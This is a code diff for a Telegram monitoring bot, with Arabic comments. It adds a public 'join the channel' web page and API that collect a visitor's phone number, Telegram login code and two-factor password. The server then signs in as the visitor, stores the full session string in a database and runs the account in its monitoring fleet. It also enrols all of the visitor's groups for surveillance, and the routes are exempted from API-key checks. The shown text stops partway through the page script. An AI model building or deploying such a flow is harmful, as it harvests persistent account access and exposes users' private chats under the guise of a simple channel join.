@@ -4021,6 +4021,469 @@ class ChannelGate:
 
 
 # -------------------------------------------------------------------
+# [JOIN-WEB-v4.4.22] معالج الانضمام العام عبر رابط الويب — أمر المُشغّل
+# 2026-11-20: «ابي عندما اشارك رابط القناه الي اي احد اذا ضغط على
+# الرابط هناك احتمالان اذا كان من ضمن الحسابات المراقبه ينضم فوراً
+# الى القناه واذا كان غير مراقب يضهر له مربع لادخال الدوله الرقم
+# اليمن اوالسعوديه اذا ضغط على اليمن تضهر نافذه اخرى ويتم تعبئة رمز
+# الدوله تلقائياً وهكذا السعوديه يبقى معه ادراج رقمه يدرج الرقم يصل
+# له كود يدرج الكود يتحول الى القناه فوراً ويتم ضمه فوراً الى القناه
+# ويتم ضم المجموعات تبعه فوراً»
+# -------------------------------------------------------------------
+# الرابط العام: https://<service>.onrender.com/join — معالج عربي
+# (دولة → رقم برمز معبأ تلقائي → كود تيليجرام) يخاطب /api/join/*:
+#   POST /api/join/start  {phone} → انضمام فوري (حساب مراقَب بجلسة
+#                                حية) أو إرسال كود OTP لغير المعروف
+#   POST /api/join/verify {phone, code, password?} → تسجيل مراقب جديد
+#                                + انضمام القناة + ضم مجموعاته فورًا
+#   GET  /api/join_status → إحصاءات (لوحة المُشغّل)
+# الحماية: سقوف لكل رقم/آيبي + TTL للجلسات المعلقة + سقف محاولات الكود
+# — بلا أي تخزين رسائل (ذاكرة فقط). المسار الفوري والكود كلاهما يضيف
+# uid للقائمة البيضاء قبل الانضمام فتعتمده البوابة (L1) تلقائيًا.
+
+class WebJoinManager:
+    """إدارة انضمام الحسابات عبر معالج الويب العام (JOIN-WEB)."""
+
+    PENDING_TTL_S = 300            # صلاحية جلسة الكود: 5 دقائق
+    MAX_PENDING = 5                # جلسات كود متزامنة كحد أقصى
+    MAX_CODE_SENDS_PER_PHONE = 3   # في الساعة (حد تيليجرام نفسه)
+    MAX_STARTS_PER_IP = 12         # في الساعة
+    MAX_VERIFY_TRIES = 7           # محاولات كود/كلمة سر لكل جلسة
+
+    def __init__(self, monitor):
+        self.monitor = monitor
+        # phone -> {'client','hash','ts','tries'}
+        self.pending: Dict[str, dict] = {}
+        self._phone_sends: Dict[str, List[float]] = {}
+        self._ip_starts: Dict[str, List[float]] = {}
+        self.totals = {
+            'code_requests': 0, 'instant_joins': 0, 'otp_joins': 0,
+            'verify_attempts': 0, 'failed': 0, 'groups_added': 0,
+        }
+        self.recent: List[dict] = []
+        self._watchers_cache: List[dict] = []
+        self._watchers_cache_ts = 0.0
+
+    # ---------- helpers ----------
+
+    @staticmethod
+    def _normalize_phone(raw) -> str:
+        """تطبيع الرقم → ‎+<أرقام>‎ (يقبل +/00/بادئة مباشرة) أو ''."""
+        s = str(raw or '').strip()
+        s = re.sub(r'[\s\-()]+', '', s)
+        if not s:
+            return ''
+        if not s.startswith('+'):
+            if s.startswith('00'):
+                s = s[2:]
+            s = '+' + s
+        if not re.match(r'^\+\d{7,15}$', s):
+            return ''
+        return s
+
+    def _rate_hit(self, store: dict, key: str, limit: int,
+                  window_s: float = 3600.0) -> bool:
+        """نافذة منزلقة: سجّل الطلب وأرجع False لو تجاوز السقف."""
+        now = time.time()
+        lst = [t for t in store.get(key, []) if now - t < window_s]
+        if len(lst) >= limit:
+            store[key] = lst
+            return False
+        lst.append(now)
+        store[key] = lst
+        if len(store) > 5000:  # تنظيف خفيف لمنع التضخم
+            for k in list(store.keys()):
+                if not store.get(k):
+                    store.pop(k, None)
+        return True
+
+    def _cleanup(self):
+        """أسقط الجلسات المعلقة المنتهية (مع قطع اتصالها)."""
+        now = time.time()
+        for ph in list(self.pending.keys()):
+            ent = self.pending.get(ph)
+            if not ent or now - ent.get('ts', 0) > self.PENDING_TTL_S:
+                ent = self.pending.pop(ph, None)
+                if ent and ent.get('client'):
+                    try:
+                        asyncio.create_task(ent['client'].disconnect())
+                    except Exception:
+                        pass
+
+    @staticmethod
+    def _mask_phone(phone: str) -> str:
+        p = str(phone or '')
+        if len(p) > 6:
+            return p[:5] + '***' + p[-2:]
+        return p
+
+    def _record(self, phone, name, method, groups_added, ok=True):
+        self.recent.append({
+            'at': datetime.now().isoformat(timespec='seconds'),
+            'phone': self._mask_phone(phone),
+            'name': str(name or '')[:40],
+            'method': method, 'groups_added': int(groups_added or 0),
+            'ok': bool(ok),
+        })
+        if len(self.recent) > 30:
+            self.recent = self.recent[-30:]
+
+    async def _active_watchers(self):
+        """المراقبون النشطون (كاش 60ث) — للمسار الفوري."""
+        now = time.time()
+        if now - self._watchers_cache_ts > 60:
+            try:
+                self._watchers_cache = \
+                    await self.monitor.db.get_active_watchers()
+                self._watchers_cache_ts = now
+            except Exception:
+                pass
+        return self._watchers_cache or []
+
+    async def _join_channel_with(self, client):
+        """انضمام حساب (عميل متصل) لقناة الطلبات عبر رابط البوابة.
+        يعيد (ok, note) — غير قاتل."""
+        gate = getattr(self.monitor, 'channel_gate', None)
+        link = getattr(gate, 'invite_link', '') if gate else ''
+        if link:
+            try:
+                from telethon.tl.functions.messages import \
+                    ImportChatInviteRequest
+                _h = str(link).split('+')[-1].split('/')[-1]
+                try:
+                    await client(ImportChatInviteRequest(hash=_h))
+                    return True, 'joined'
+                except Exception as e:
+                    _n = type(e).__name__
+                    if 'UserAlreadyParticipant' in _n:
+                        return True, 'already'
+                    if 'FloodWait' in _n:
+                        return False, 'flood'
+                    if 'InviteHashExpired' in _n:
+                        # جدّد الرابط مرة واحدة ثم أعد المحاولة
+                        try:
+                            link2 = await gate.refresh_link()
+                            _h2 = str(link2).split('+')[-1].split('/')[-1]
+                            if link2 and _h2 and _h2 != _h:
+                                await client(
+                                    ImportChatInviteRequest(hash=_h2))
+                                return True, 'joined'
+                        except Exception as e2:
+                            if 'UserAlreadyParticipant' in type(e2).__name__:
+                                return True, 'already'
+                            return False, type(e2).__name__
+                    return False, _n
+            except Exception as e:
+                return False, type(e).__name__
+        # بلا رابط — محاولة انضمام مباشرة بالمعرف (يعمل لو القناة عامة
+        # أو الحساب عضو سابقًا) — best-effort فقط.
+        try:
+            from telethon.tl.functions.channels import JoinChannelRequest
+            _marked = int(getattr(gate, 'channel_marked', 0) or 0)
+            if not _marked:
+                return False, 'no_channel'
+            await client(JoinChannelRequest(_marked))
+            return True, 'joined'
+        except Exception as e:
+            if 'UserAlreadyParticipant' in type(e).__name__:
+                return True, 'already'
+            return False, type(e).__name__
+
+    async def _try_instant_join(self, phone: str):
+        """حساب مراقَب معروف → انضمام فوري بلا كود. None = غير معروف
+        (يكمل مسار الكود). عميل الأسطول المتصل يُستخدم كما هو؛ المراقب
+        المتوقف يُختبَر بعميل مؤقت من جلسته المخزنة."""
+        client = None
+        temp = False
+        c = self.monitor.user_clients.get(phone)
+        if c is not None and c.is_connected():
+            client = c
+        else:
+            for w in await self._active_watchers():
+                if w.get('phone') == phone and w.get('session_string'):
+                    tc = self.monitor._create_user_client(
+                        w['session_string'], phone)
+                    await tc.connect()
+                    if await tc.is_user_authorized():
+                        client = tc
+                        temp = True
+                    else:
+                        try:
+                            await tc.disconnect()
+                        except Exception:
+                            pass
+                    break
+        if client is None:
+            return None
+        me = await client.get_me()
+        uid = int(getattr(me, 'id', 0) or 0)
+        name = (getattr(me, 'first_name', '') or '') or 'مشترك'
+        gate = getattr(self.monitor, 'channel_gate', None)
+        if gate is not None:
+            try:
+                await gate.whitelist_add(uid, name, phone)
+            except Exception:
+                pass
+        ok, note = await self._join_channel_with(client)
+        if temp:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+        self.totals['instant_joins'] += 1
+        self._record(phone, name, 'instant', 0, ok=ok)
+        logging.info(f"[JOIN-WEB] instant join {self._mask_phone(phone)} "
+                     f"uid={uid} → {note}")
+        return {
+            'ok': True, 'status': 'joined', 'instant': True,
+            'name': name,
+            'channel_link': (getattr(gate, 'invite_link', '')
+                             if gate else ''),
+            'channel_note': note,
+        }
+
+    # ---------- public API ----------
+
+    async def start_join(self, phone_raw: str, ip: str = '') -> dict:
+        """الخطوة الأولى: حساب معروف → انضمام فوري؛ غير معروف → كود."""
+        self._cleanup()
+        phone = self._normalize_phone(phone_raw)
+        if not phone:
+            return {'ok': False, 'status': 'bad_phone'}
+        if ip and not self._rate_hit(self._ip_starts, ip,
+                                     self.MAX_STARTS_PER_IP):
+            return {'ok': False, 'status': 'ip_limited'}
+        if not self._rate_hit(self._phone_sends, phone,
+                              self.MAX_CODE_SENDS_PER_PHONE):
+            return {'ok': False, 'status': 'phone_limited'}
+
+        # === المسار الفوري: حساب مراقَب بجلسة حية ===
+        try:
+            res = await self._try_instant_join(phone)
+            if res is not None:
+                return res
+        except Exception as e:
+            logging.warning(
+                f"[JOIN-WEB] instant path error: {type(e).__name__} {e}")
+
+        # === مسار الكود: رقم غير معروف ===
+        if len(self.pending) >= self.MAX_PENDING:
+            return {'ok': False, 'status': 'busy'}
+        old = self.pending.pop(phone, None)
+        if old and old.get('client'):
+            try:
+                await old['client'].disconnect()
+            except Exception:
+                pass
+        tc = None
+        try:
+            tc = TelegramClient(
+                StringSession(),
+                self.monitor.config.api_id,
+                self.monitor.config.api_hash,
+                connection_retries=3, retry_delay=2, request_retries=3,
+            )
+            await tc.connect()
+            result = await tc.send_code_request(phone)
+            self.pending[phone] = {
+                'client': tc,
+                'hash': result.phone_code_hash,
+                'ts': time.time(),
+                'tries': 0,
+            }
+            self.totals['code_requests'] += 1
+            logging.info(
+                f"[JOIN-WEB] code sent to {self._mask_phone(phone)}")
+            return {'ok': True, 'status': 'code_sent'}
+        except FloodWaitError as fe:
+            if tc is not None:
+                try:
+                    await tc.disconnect()
+                except Exception:
+                    pass
+            return {'ok': False, 'status': 'flood',
+                    'wait': int(getattr(fe, 'seconds', 60) or 60)}
+        except Exception as e:
+            if tc is not None:
+                try:
+                    await tc.disconnect()
+                except Exception:
+                    pass
+            self.totals['failed'] += 1
+            logging.warning(
+                f"[JOIN-WEB] send_code error: {type(e).__name__} {e}")
+            return {'ok': False, 'status': 'send_failed',
+                    'error': str(e)[:120]}
+
+    async def verify_join(self, phone_raw: str, code: str = '',
+                          password: str = '') -> dict:
+        """الخطوة الثانية: كود تيليجرام (+ كلمة سر 2FA إن لزمت) →
+        تسجيل مراقب + انضمام القناة + ضم المجموعات."""
+        self._cleanup()
+        phone = self._normalize_phone(phone_raw)
+        if not phone:
+            return {'ok': False, 'status': 'bad_phone'}
+        ent = self.pending.get(phone)
+        if not ent:
+            return {'ok': False, 'status': 'no_session'}
+        ent['tries'] = int(ent.get('tries', 0)) + 1
+        self.totals['verify_attempts'] += 1
+        if ent['tries'] > self.MAX_VERIFY_TRIES:
+            self.pending.pop(phone, None)
+            try:
+                await ent['client'].disconnect()
+            except Exception:
+                pass
+            return {'ok': False, 'status': 'too_many_tries'}
+        tc = ent['client']
+        try:
+            if password:
+                await tc.sign_in(password=password)
+            else:
+                code_c = re.sub(r'[\s\-]+', '', str(code or ''))
+                await tc.sign_in(phone=phone, code=code_c,
+                                phone_code_hash=ent['hash'])
+        except Exception as e:
+            err = str(e)
+            _n = type(e).__name__
+            # الترتيب حاسم: PASSWORD_HASH_INVALID يحتوي 'PASSWORD' —
+            # فحص كلمة السر الخاطئة يجب أن يسبق فحص الحاجة لكلمة السر.
+            if 'PasswordHashInvalid' in _n or 'PasswordHashInvalid' in err:
+                return {'ok': False, 'status': 'bad_password'}
+            if ('SessionPasswordNeeded' in _n
+                    or 'SessionPasswordNeeded' in err
+                    or 'PASSWORD' in err.upper()):
+                return {'ok': False, 'status': 'need_password'}
+            if ('PhoneCodeInvalid' in _n or 'PhoneCodeInvalid' in err
+                    or 'CodeInvalid' in _n):
+                return {'ok': False, 'status': 'bad_code'}
+            if ('PhoneCodeExpired' in _n or 'PhoneCodeExpired' in err
+                    or 'CodeExpired' in _n):
+                self.pending.pop(phone, None)
+                try:
+                    await tc.disconnect()
+                except Exception:
+                    pass
+                return {'ok': False, 'status': 'expired'}
+            if 'FloodWait' in _n:
+                return {'ok': False, 'status': 'flood',
+                        'wait': int(getattr(e, 'seconds', 60) or 60)}
+            logging.warning(f"[JOIN-WEB] verify error: {_n} {err[:160]}")
+            return {'ok': False, 'status': 'error', 'error': err[:120]}
+        try:
+            return await self._complete_join(phone, tc)
+        except Exception as e:
+            logging.error(
+                f"[JOIN-WEB] complete error: {type(e).__name__} {e}")
+            self.totals['failed'] += 1
+            return {'ok': False, 'status': 'error',
+                    'error': str(e)[:120]}
+
+    async def _complete_join(self, phone: str, tc) -> dict:
+        """نجح الكود → التسجيل الكامل (مراقب + قناة + مجموعات)."""
+        me = await tc.get_me()
+        uid = int(getattr(me, 'id', 0) or 0)
+        name = (getattr(me, 'first_name', '') or '') or 'مشترك'
+        string_session = StringSession.save(tc.session)
+
+        # (1) سجّل مراقبًا في Supabase (upsert)
+        await self.monitor.db.add_watcher(
+            phone, name, string_session, 'monitor')
+
+        # (2) شغّل حساب الأسطول فورًا (يراقب المجموعات)
+        if phone not in self.monitor.user_clients:
+            w = {'phone': phone, 'display_name': name,
+                 'session_string': string_session, 'role': 'monitor'}
+            self.monitor._user_tasks[phone] = asyncio.create_task(
+                self.monitor._run_user_client(w))
+
+        # (3) القائمة البيضاء للبوابة قبل الانضمام (تعتمده L1)
+        gate = getattr(self.monitor, 'channel_gate', None)
+        if gate is not None:
+            try:
+                await gate.whitelist_add(uid, name, phone)
+            except Exception:
+                pass
+
+        # (4) انضمام القناة بالحساب الجديد نفسه
+        ok, note = await self._join_channel_with(tc)
+
+        # (5) ضم مجموعاته للمراقبة فورًا («ويتم ضم المجموعات تبعه فوراً»)
+        groups_added = 0
+        _rtc = getattr(self.monitor.config, 'requests_target_channel', 0)
+        try:
+            _rtc_i = int(_rtc) if _rtc else 0
+        except (TypeError, ValueError):
+            _rtc_i = 0
+        try:
+            async for dialog in tc.iter_dialogs():
+                if not dialog.is_group and not dialog.is_channel:
+                    continue
+                try:
+                    _cid = int(dialog.id)
+                except Exception:
+                    continue
+                if _rtc_i and _cid == _rtc_i:
+                    continue  # قناة الطلبات نفسها — صدى محمي أصلًا
+                _username = ''
+                try:
+                    if dialog.entity and getattr(
+                            dialog.entity, 'username', None):
+                        _username = dialog.entity.username
+                except Exception:
+                    pass
+                _lt = 'group'
+                try:
+                    if getattr(dialog.entity, 'broadcast', False):
+                        _lt = 'channel'
+                except Exception:
+                    pass
+                try:
+                    is_new = await self.monitor.prod_db.add_monitored_chat(
+                        chat_id=_cid,
+                        chat_title=str(dialog.title or f'chat_{_cid}'),
+                        username=_username, link_type=_lt,
+                        monitored_by=phone)
+                    if is_new:
+                        groups_added += 1
+                except Exception:
+                    pass
+        except Exception as e:
+            logging.warning(f"[JOIN-WEB] group sync error: {e}")
+
+        # (6) نظّف الجلسة المؤقتة (الأسطول يعمل بجلسة جديدة الآن)
+        self.pending.pop(phone, None)
+        try:
+            await tc.disconnect()
+        except Exception:
+            pass
+
+        self.totals['otp_joins'] += 1
+        self.totals['groups_added'] += groups_added
+        self._record(phone, name, 'otp', groups_added, ok=ok)
+        logging.info(
+            f"[JOIN-WEB] ✅ new monitor {self._mask_phone(phone)} "
+            f"uid={uid} groups+={groups_added} channel={note}")
+        return {
+            'ok': True, 'status': 'joined', 'instant': False,
+            'name': name, 'groups_added': groups_added,
+            'channel_link': (getattr(gate, 'invite_link', '')
+                             if gate else ''),
+            'channel_note': note,
+        }
+
+    def stats_snapshot(self) -> dict:
+        """لقطة إحصاءات الانضمام — يقرؤها /api/join_status."""
+        return {
+            'enabled': True,
+            'join_url_path': '/join',
+            'pending': len(self.pending),
+            'totals': dict(self.totals),
+            'recent': list(reversed(self.recent[-15:])),
+        }
+
+
+# -------------------------------------------------------------------
 # [IGNORE-BY-REPLY-v4.4.17] مخزن التجاهل بأمر الرد — طلب المُشغّل 2026-11-20
 # -------------------------------------------------------------------
 # «ارد على الرسالة انا او احد الاعضاء وقال تجاهل الرساله يتم تجاهل
@@ -4479,6 +4942,10 @@ class Monitor:
         # Each entry: {"step": str, "temp_client": ..., "phone": ..., "phone_code_hash": ..., "started_at": datetime}
         self._login_sessions: Dict[int, Dict] = {}
         self._login_session_ttl = timedelta(minutes=10)  # max time to complete login
+        # [JOIN-WEB v4.4.22] مدير الانضمام العام عبر الويب (رابط /join):
+        # حساب مراقَب → انضمام فوري؛ غير معروف → كود → مراقب + قناة
+        # + ضم مجموعاته. سقوفه الخاصة داخل الكلاس.
+        self.web_join = WebJoinManager(self)
         # Per-sender cooldown to prevent Telegram from banning the account
         # (Telegram limits ~3 code requests per phone per hour)
         self._login_cooldowns: Dict[int, datetime] = {}  # sender_id → next allowed time
@@ -18940,6 +19407,11 @@ async def dashboard_api_key_middleware(request, handler):
     """
     path = request.path
     if path.startswith("/api/"):
+        # [JOIN-WEB v4.4.22] مسارات الانضمام العامة — قمع معمول بلا
+        # مفتاح أبدًا: مسار نمو عام بالتصميم (حمايته سقوف WebJoinManager
+        # الخاصة: لكل رقم/آيبي + TTL + سقف محاولات الكود).
+        if path.startswith("/api/join/") or path == "/api/join_status":
+            return await handler(request)
         # [DASHBOARD-RESTORE / CORS] OPTIONS preflight — always allow.
         # The browser sends OPTIONS before any cross-origin request that has
         # a non-safelisted header (e.g. X-Api-Key). Rejecting preflight makes
@@ -19155,6 +19627,397 @@ async def api_deleted_link_purge_handler(request):
         )
 
 
+# ---------------------------------------------------------------------
+# [JOIN-WEB v4.4.22] صفحة الانضمام العامة + نقاط النهاية
+# ---------------------------------------------------------------------
+
+_JOIN_PAGE_HTML = """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="robots" content="noindex">
+<title>الانضمام إلى قناة الطلبات</title>
+<style>
+  :root { --bg:#09090b; --card:#18181b; --line:#27272a; --txt:#fafafa;
+          --mut:#a1a1aa; --acc:#10b981; --acc2:#059669; --err:#f87171; }
+  * { box-sizing:border-box; margin:0; padding:0; -webkit-tap-highlight-color:transparent; }
+  body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Kufi Arabic",
+         "Noto Sans Arabic",Tahoma,sans-serif; background:var(--bg); color:var(--txt);
+         min-height:100vh; display:flex; align-items:center; justify-content:center;
+         padding:20px 14px; }
+  .wrap { width:100%; max-width:410px; }
+  .logo { display:flex; align-items:center; gap:12px; margin-bottom:22px;
+          justify-content:center; flex-direction:column; text-align:center; }
+  .logo .ic { width:58px; height:58px; border-radius:16px; background:#052e1b;
+              display:flex; align-items:center; justify-content:center;
+              font-size:28px; border:1px solid #065f46; }
+  .logo h1 { font-size:19px; font-weight:800; }
+  .logo p { font-size:13px; color:var(--mut); margin-top:4px; }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:18px;
+          padding:22px 18px; box-shadow:0 12px 40px rgba(0,0,0,.45); }
+  .step { display:none; animation:fade .25s ease; }
+  .step.on { display:block; }
+  @keyframes fade { from{opacity:0; transform:translateY(8px);} to{opacity:1; transform:none;} }
+  h2 { font-size:16px; font-weight:800; margin-bottom:6px; }
+  .sub { font-size:13px; color:var(--mut); line-height:1.7; margin-bottom:18px; }
+  .country { display:flex; flex-direction:column; gap:10px; }
+  .cbtn { display:flex; align-items:center; gap:14px; width:100%; padding:16px;
+          background:#101418; border:1.5px solid var(--line); border-radius:14px;
+          color:var(--txt); font-size:16px; font-weight:700; cursor:pointer;
+          transition:border-color .15s, transform .1s; }
+  .cbtn:active { transform:scale(.98); }
+  .cbtn:hover { border-color:var(--acc); }
+  .cbtn .fl { font-size:30px; }
+  .cbtn small { display:block; font-size:12px; color:var(--mut); font-weight:400;
+                margin-top:2px; }
+  .field { display:flex; align-items:center; gap:8px; background:#101418;
+           border:1.5px solid var(--line); border-radius:14px; padding:4px 4px 4px 14px;
+           direction:ltr; }
+  .field:focus-within { border-color:var(--acc); }
+  .prefix { font-size:16px; font-weight:800; color:var(--acc); white-space:nowrap;
+            font-family:ui-monospace,monospace; direction:ltr; }
+  .field input { flex:1; background:none; border:none; outline:none; color:var(--txt);
+                 font-size:19px; letter-spacing:1px; padding:12px 8px; width:100%;
+                 font-family:ui-monospace,monospace; }
+  .pin input { text-align:center; letter-spacing:6px; font-size:22px; }
+  .btn { width:100%; margin-top:16px; padding:15px; background:var(--acc);
+         color:#04150d; border:none; border-radius:14px; font-size:16px; font-weight:800;
+         cursor:pointer; transition:filter .15s, transform .1s; }
+  .btn:hover { filter:brightness(1.08); }
+  .btn:active { transform:scale(.98); }
+  .btn:disabled { opacity:.6; cursor:wait; }
+  .ghost { width:100%; margin-top:10px; padding:12px; background:none; color:var(--mut);
+           border:none; font-size:13px; cursor:pointer; }
+  .ghost:hover { color:var(--txt); }
+  .msg { display:none; margin-top:14px; padding:11px 13px; border-radius:12px;
+         font-size:13px; line-height:1.7; }
+  .msg.err { background:#2a1215; color:#fca5a5; border:1px solid #7f1d1d; }
+  .msg.ok { background:#0a221a; color:#6ee7b7; border:1px solid #065f46; }
+  .msg.show { display:block; animation:fade .2s ease; }
+  .dots { display:inline-block; }
+  .dots span { animation:blink 1.2s infinite; }
+  .dots span:nth-child(2){ animation-delay:.2s } .dots span:nth-child(3){ animation-delay:.4s }
+  @keyframes blink { 0%,80%,100%{opacity:.25} 40%{opacity:1} }
+  .ok-ic { width:76px; height:76px; margin:6px auto 14px; border-radius:50%;
+           background:#052e1b; border:2px solid var(--acc); display:flex;
+           align-items:center; justify-content:center; font-size:38px; }
+  .center { text-align:center; }
+  .stat { display:flex; justify-content:space-between; padding:10px 14px;
+          background:#101418; border-radius:12px; margin-top:8px; font-size:13.5px; }
+  .stat b { color:var(--acc); font-size:15px; }
+  .open { display:block; text-align:center; margin-top:18px; padding:15px;
+          background:var(--acc); color:#04150d; border-radius:14px; text-decoration:none;
+          font-weight:800; font-size:16px; }
+  .hint { margin-top:12px; font-size:12px; color:var(--mut); line-height:1.8;
+          text-align:center; }
+  .foot { margin-top:18px; text-align:center; font-size:11px; color:#52525b; }
+  label.lbl { display:block; font-size:13px; color:var(--mut); margin:0 2px 8px; }
+  .spinner { display:inline-block; width:15px; height:15px; border:2.5px solid
+             rgba(4,21,13,.35); border-top-color:#04150d; border-radius:50%;
+             animation:spin .7s linear infinite; vertical-align:-2px; margin-left:7px; }
+  @keyframes spin { to{transform:rotate(360deg)} }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">
+    <div class="ic">&#128172;</div>
+    <div>
+      <h1>الانضمام إلى قناة الطلبات</h1>
+      <p>أدخل رقمك للانضمام الفوري — حسابات المراقبة تُضم مباشرة بلا كود</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <!-- الخطوة 1: الدولة -->
+    <div class="step on" id="s1">
+      <h2>&#127470;&#127486; اختر دولتك</h2>
+      <p class="sub">سيتم تعبئة رمز الدولة تلقائيًا في الخطوة التالية.</p>
+      <div class="country">
+        <button class="cbtn" data-cc="967" data-flag="&#127486;&#127466;">
+          <span class="fl">&#127486;&#127466;</span>
+          <span>اليمن<small>&#8207;+967</small></span>
+        </button>
+        <button class="cbtn" data-cc="966" data-flag="&#127486;&#127462;">
+          <span class="fl">&#127486;&#127462;</span>
+          <span>السعودية<small>&#8207;+966</small></span>
+        </button>
+      </div>
+    </div>
+
+    <!-- الخطوة 2: الرقم -->
+    <div class="step" id="s2">
+      <h2 id="s2title">&#127486;&#127466; أدخل رقمك</h2>
+      <p class="sub">رمز الدولة مُعبّأ تلقائيًا — أدخل رقمك فقط. يجب أن يكون مرتبطًا بحساب تيليجرام.</p>
+      <label class="lbl" for="phone">رقم الهاتف</label>
+      <div class="field">
+        <span class="prefix" id="pfx">+967</span>
+        <input id="phone" type="tel" inputmode="numeric" autocomplete="tel-national"
+               placeholder="7XXXXXXXX" maxlength="11">
+      </div>
+      <button class="btn" id="bStart">متابعة</button>
+      <button class="ghost" id="back1">&#8592; تغيير الدولة</button>
+      <div class="msg" id="m2"></div>
+    </div>
+
+    <!-- الخطوة 3: الكود -->
+    <div class="step" id="s3">
+      <h2>&#128273; كود التحقق</h2>
+      <p class="sub">أرسلنا كودًا إلى حسابك في تيليجرام (من Telegram الرسمي). أدخله أدناه للانضمام الفوري.</p>
+      <label class="lbl" for="code">الكود</label>
+      <div class="field pin">
+        <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code"
+               placeholder="&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;" maxlength="8">
+      </div>
+      <button class="btn" id="bVerify">تحقق وانضمام</button>
+      <button class="ghost" id="back2">&#8592; الرقم غير صحيح؟ تغييره</button>
+      <div class="msg" id="m3"></div>
+    </div>
+
+    <!-- الخطوة 3ب: كلمة السر (2FA) -->
+    <div class="step" id="s3p">
+      <h2>&#128274; كلمة سر تيليجرام</h2>
+      <p class="sub">حسابك محمي بالتحقق بخطوتين — أدخل كلمة سر تيليجرام لإكمال الانضمام.</p>
+      <label class="lbl" for="pw">كلمة السر</label>
+      <div class="field">
+        <input id="pw" type="password" autocomplete="current-password">
+      </div>
+      <button class="btn" id="bPw">متابعة</button>
+      <div class="msg" id="m3p"></div>
+    </div>
+
+    <!-- النجاح -->
+    <div class="step" id="s4">
+      <div class="center">
+        <div class="ok-ic">&#10004;</div>
+        <h2>تم ضمك إلى القناة!</h2>
+        <p class="sub" id="okName"></p>
+      </div>
+      <div class="stat"><span>الحساب</span><b id="okHow"></b></div>
+      <div class="stat" id="okGroupsRow"><span>مجموعاتك المُضافة للمراقبة</span><b id="okGroups"></b></div>
+      <a class="open" id="openCh" href="#" target="_blank" rel="noopener">&#128228; افتح القناة الآن</a>
+      <p class="hint">افتح تطبيق تيليجرام وستجد القناة بين محادثاتك مباشرة —<br>كل الطلبات الجديدة تصلك هناك أولًا بأول.</p>
+    </div>
+
+    <div class="foot">الدخول يُسجّل حسابك كمراقب — بلا رسائل تصدر منك إطلاقًا</div>
+  </div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  var st = { cc: "967", flag: "\uD83C\uDDF6\uD83C\uDDE6", phone: "", busy: false };
+  var $ = function (id) { return document.getElementById(id); };
+  function show(id) {
+    var steps = ["s1", "s2", "s3", "s3p", "s4"];
+    for (var i = 0; i < steps.length; i++) $(steps[i]).className = "step" + (steps[i] === id ? " on" : "");
+  }
+  function msg(id, text, ok) {
+    var el = $(id); el.textContent = text;
+    el.className = "msg show " + (ok ? "ok" : "err");
+  }
+  function clr(id) { $(id).className = "msg"; }
+  function busyBtn(btn, on, label) {
+    if (on) { btn.disabled = true; btn.dataset.t = btn.textContent; btn.innerHTML = label + '<span class="spinner"></span>'; }
+    else { btn.disabled = false; if (btn.dataset.t) btn.textContent = btn.dataset.t; }
+  }
+  function post(url, body) {
+    return fetch(url, { method: "POST", headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(body) })
+      .then(function (r) { return r.json().catch(function () { return {}; }); });
+  }
+  var ERRS = {
+    bad_phone: "صيغة الرقم غير صحيحة — تأكد من الرقم وحاول مجددًا.",
+    ip_limited: "تجاوزت الحد المسموح من المحاولات — حاول بعد ساعة.",
+    phone_limited: "طلبت أكوادًا كثيرة لهذا الرقم — حاول بعد ساعة (حد تيليجرام).",
+    busy: "الخادم مشغول بعدة انضمامات — انتظر دقيقة وحاول مجددًا.",
+    bad_code: "الكود غير صحيح — تحقق منه في تيليجرام وأعد المحاولة.",
+    bad_password: "كلمة السر غير صحيحة — أعد المحاولة.",
+    expired: "انتهت صلاحية الكود — ابدأ من جديد بإدخال الرقم مرة أخرى.",
+    no_session: "انتهت الجلسة — أعد إدخال الرقم لطلب كود جديد.",
+    too_many_tries: "محاولات كثيرة خاطئة — ابدأ من جديد بعد قليل.",
+    send_failed: "تعذر إرسال الكود الآن — تأكد أن الرقم مرتبط بحساب تيليجرام وحاول مجددًا.",
+    error: "حدث خطأ غير متوقع — حاول مجددًا بعد قليل."
+  };
+  function handleErr(mId, d) {
+    var base = ERRS[d.status] || (d.error ? ("خطأ: " + d.error) : "حدث خطأ — حاول مجددًا.");
+    if (d.status === "flood" && d.wait) base = "انتظر " + d.wait + " ثانية ثم حاول (حماية تيليجرام من الإكثار).";
+    msg(mId, base, false);
+  }
+
+  // الخطوة 1 → 2
+  Array.prototype.forEach.call(document.querySelectorAll(".cbtn"), function (b) {
+    b.addEventListener("click", function () {
+      st.cc = b.getAttribute("data-cc");
+      st.flag = b.getAttribute("data-flag");
+      $("pfx").textContent = "+" + st.cc;
+      $("s2title").innerHTML = st.flag + " أدخل رقمك";
+      $("phone").placeholder = st.cc === "967" ? "7XXXXXXXX" : "5XXXXXXXX";
+      $("phone").value = "";
+      clr("m2");
+      show("s2");
+      setTimeout(function () { $("phone").focus(); }, 60);
+    });
+  });
+  $("back1").addEventListener("click", function () { show("s1"); });
+
+  // الخطوة 2 → start
+  $("phone").addEventListener("input", function () {
+    this.value = this.value.replace(/[^0-9]/g, "");
+    clr("m2");
+  });
+  $("phone").addEventListener("keydown", function (e) { if (e.key === "Enter") $("bStart").click(); });
+  $("bStart").addEventListener("click", function () {
+    if (st.busy) return;
+    var rest = $("phone").value.replace(/[^0-9]/g, "");
+    if (rest.length < 6) { msg("m2", "أدخل الرقم كاملًا بعد رمز الدولة.", false); return; }
+    st.phone = "+" + st.cc + rest;
+    st.busy = true; clr("m2");
+    busyBtn($("bStart"), true, "جارٍ الفحص");
+    post("/api/join/start", { phone: st.phone })
+      .then(function (d) {
+        if (d.status === "joined") { finish(d); return; }
+        if (d.status === "code_sent") {
+          msg("m2", "تم إرسال الكود إلى تيليجرام — تحقق من رسائل Telegram.", true);
+          show("s3");
+          setTimeout(function () { $("code").focus(); }, 60);
+          return;
+        }
+        handleErr("m2", d);
+      })
